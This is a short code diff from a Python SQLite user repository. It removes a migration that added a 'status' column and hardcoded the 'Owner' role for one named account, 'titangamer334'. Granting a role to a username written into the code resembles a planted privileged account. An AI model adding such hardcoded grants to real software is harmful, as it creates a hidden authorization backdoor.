@@ -244,11 +244,7 @@ class UserRepository:
                 )
                 """
             )
-            try:
-                conn.execute("ALTER TABLE users ADD COLUMN status TEXT NOT NULL DEFAULT 'User'")
-            except sqlite3.OperationalError:
-                pass
-            conn.execute("UPDATE users SET status = 'Owner' WHERE name = 'titangamer334'")
+
 
     @staticmethod
     def hash_password(password, salt):
